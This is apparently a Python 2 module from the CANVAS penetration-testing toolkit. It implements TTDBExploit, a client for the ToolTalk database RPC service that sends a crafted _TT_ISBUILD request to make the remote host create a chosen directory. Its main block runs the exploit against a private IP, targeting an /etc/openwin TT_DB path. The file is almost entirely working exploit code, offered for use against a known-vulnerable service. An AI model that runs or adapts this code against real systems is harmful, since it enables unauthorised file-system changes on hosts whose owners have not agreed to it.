#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import socket
import os
from libs import xdr
from libs import rpc
from libs.rpc import Packer, Unpacker, TCPClient


class TTDBException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`

class TTDB_Packer(Packer):
    
    def pack_ttdb_isbuild_req(self, rdir):
        #path
        self.pack_string(rdir)
        #reclen
        self.pack_int(len(rdir))
        #struct keydesc
        #key_flags
        self.pack_int(1)
        #key_nparts
        self.pack_int(2)
        #struct keypart
        #kp_type
        self.pack_int(1)
        #kp_leng
        self.pack_int(0)
        #kp_start
        self.pack_int(2)
        self.pack_int(1)
        for i in range(0,21):
            self.pack_int(0xdeadbeefL)
        #mode
        self.pack_int(0x10002)
        #isreclen
        self.pack_int(len(rdir))
        

class TTDB_Unpacker(Unpacker):
    
    def unpack_ttdb_isbuild_reply(self):
        result = self.unpack_int()
        iserrno = self.unpack_int()
        return (result, iserrno)
        
class TTDB_Client(TCPClient):

    def __init__(self, target):
        self.ttdb_d = { "PROGNUM": 100083, "VERSNUM": 1, "ISBUILD": 3 }
        self.iserrno_db = {
            0: "TT_DB_OK",
            1: "TT_DB_WRN_FORWARD_POINTER",
            2: "TT_DB_WRN_SAME_OBJECT_ID",
            3: "TT_DB_ERR_DB_CONNECTION_FAILED",
            4: "TT_DB_ERR_DB_OPEN_FAILED",
            5: "TT_DB_ERR_DB_LOCKED",
            6: "TT_DB_ERR_RPC_CONNECTION_FAILED",
            7: "TT_DB_ERR_RPC_FAILED",
            8: "TT_DB_ERR_CORRUPT_DB",
            9: "TT_DB_ERR_DISK_FULL",
            10: "TT_DB_ERR_ILLEGAL_FILE",
            11: "TT_DB_ERR_ILLEGAL_OBJECT",
            12: "TT_DB_ERR_ILLEGAL_PROPERTY",
            13: "TT_DB_ERR_ILLEGAL_MESSAGE",
            14: "TT_DB_ERR_SAME_FILE",
            15: "TT_DB_ERR_SAME_OBJECT",
            16: "TT_DB_ERR_FILE_EXISTS",
            17: "TT_DB_ERR_OBJECT_EXISTS",
            18: "TT_DB_ERR_NO_SUCH_FILE",
            19: "TT_DB_ERR_NO_SUCH_OBJECT",
            20: "TT_DB_ERR_NO_SUCH_PROPERTY",
            21: "TT_DB_ERR_ACCESS_DENIED",
            22: "TT_DB_ERR_NO_ACCESS_INFO",
            23: "TT_DB_ERR_NO_OTYPE",
            24: "TT_DB_ERR_OTYPE_ALREADY_SET",
            25: "TT_DB_ERR_UPDATE_CONFLICT",
            26: "TT_DB_ERR_PROPS_CACHE_ERROR"
            }
        
        TCPClient.__init__(self, target, self.ttdb_d["PROGNUM"], self.ttdb_d["VERSNUM"])

    def addpackers(self):
        self.packer = TTDB_Packer()
        self.unpacker = TTDB_Unpacker("")

    def mkcred(self):
        import random
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1,99999),\
                                                      "localhost", 0, 0, [])
        return self.cred
    
    def isbuild(self, rdir):
        return self.make_call(self.ttdb_d["ISBUILD"], rdir,\
                              self.packer.pack_ttdb_isbuild_req,\
                              self.unpacker.unpack_ttdb_isbuild_reply)
    
class TTDBExploit(TTDB_Client):
    
    def __init__(self, target="", rdir="", timeout = 5):
        self.tm = timeout
        self.target = target
        self.rdir = rdir
        
    def set_target(self, ip):
        try:
            self.target = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise TTDBException, "TTDBExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.target
    
    def set_rdir(self, rdir):
        self.rdir = rdir

    def get_rdir(self):
        return self.rdir

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            TTDB_Client.__init__(self, self.target)
        except (socket.error, RuntimeError), self.err:
            raise TTDBException, str(self.err)
        
    def run(self):
        
        self.result, self.iserrno = self.isbuild(self.rdir)
        if self.result < 0:
            if self.iserrno == 17:
                return 0 #success! TT_DB dir already exist
            else:
                raise TTDBException, self.iserrno_db[self.iserrno]
            
        if self.iserrno == 0: #check if successful
            self.result, self.iserrno = self.isbuild(self.rdir)
            if self.result == -1 and self.iserrno == 17:
                return 0 #success!
            else:
                raise TTDBException, self.iserrno_db[self.iserrno]
        
         
if __name__ == "__main__":

    ttdb = TTDBExploit("172.17.1.166", "/etc/openwin/devdata/profiles/TT_DB/oid_container")

    ttdb.set_target("172.17.1.166")
    ttdb.set_rdir("/etc/openwin/devdata/profiles/TT_DB/oid_container")
    print ttdb.get_target(), ttdb.get_rdir()
    ttdb.setup()
    i = ttdb.run()
    if not i:
        print "directory successfully created"

